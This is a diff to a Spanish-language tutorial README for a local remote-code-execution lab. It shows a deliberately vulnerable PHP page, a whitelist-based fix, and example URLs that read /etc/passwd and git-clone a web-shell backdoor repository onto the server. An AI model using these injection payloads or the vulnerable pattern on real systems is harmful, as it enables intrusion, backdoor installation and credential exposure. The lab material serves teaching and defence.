@@ -2,10 +2,12 @@
 
 Una vulnerabilidad RCE consiste en ejecutar comandos de forma remota en el servidor para acceder a él o para instalar malware en el servidor.
 
-### Vulnerable Website
+### Sitio web vulnerable
+
 http://localhost:8080/RCE/rce_vulnerable.php
 
-En este sitio puedes enviar un comando y el servidor lo ejecutara, puedes probar con el comando ls.
+En este sitio puedes enviar un comando y el servidor lo ejecutará; puedes probar con el comando `ls`.
+
 ```
 <?php
 ini_set('display_errors', 1);
@@ -23,23 +25,24 @@ http://localhost:8080/RCE/rce_vulnerable.php?cmd=ls
 
 ![alt text](./images/ls_example.png)
 
-Ejecutando un comando git clone podrias instalar un repositorio de Github en el servidor.
+Ejecutando un comando `git clone` podrías instalar un repositorio de GitHub en el servidor.
+
+> [!WARNING]
+> **ESTE COMANDO INSTALARÁ UN BACKDOOR EN EL CONTENEDOR Y PODRÍA HACER SALTAR WINDOWS DEFENDER. HAZLO SOLO SI SABES LO QUE HACES, EL CONTENEDOR NO GUARDA NADA EN LA MÁQUINA ANFITRIONA.**
 
 http://localhost:8080/RCE/rce_vulnerable.php?cmd=git%20clone%20https://github.com/xl7dev/WebShell.git
 
-*Es posible que necesite modificar los permisos de la carpeta para hacer esto*
-
-Tambien podrias tratar de obtener el fichero etc/passwd.
+También podrías tratar de obtener el fichero `/etc/passwd`.
 
 http://localhost:8080/RCE/rce_vulnerable.php?cmd=cat%20/etc/passwd
 
 ![alt text](./images/passwd_example.png)
 
-### Sitio web seguro.
+### Sitio web seguro
 
 http://localhost:8080/RCE/rce_safe.php
 
-Aunque lo ideal sería no permitir al sitio web ejecutar comandos ai necesitamos la ejecución de determinados comandos podemos crear una lista blanca de los comandos que vamos a jeecutar.
+Aunque lo ideal sería no permitir al sitio web ejecutar comandos, si necesitamos la ejecución de determinados comandos podemos crear una lista blanca de los comandos que vamos a ejecutar.
 
 ```
 <?php
@@ -58,7 +61,8 @@ $output = shell_exec(escapeshellarg($_GET['cmd']));
 echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
 ?>
 ```
-Si ejecutamos un comando no permitido se detendra la ejecución antes de ejecutarlo.
+
+Si ejecutamos un comando no permitido, se detendrá la ejecución antes de ejecutarlo.
 
 http://localhost:8080/RCE/rce_safe.php?cmd=cat%20/etc/passwd
 
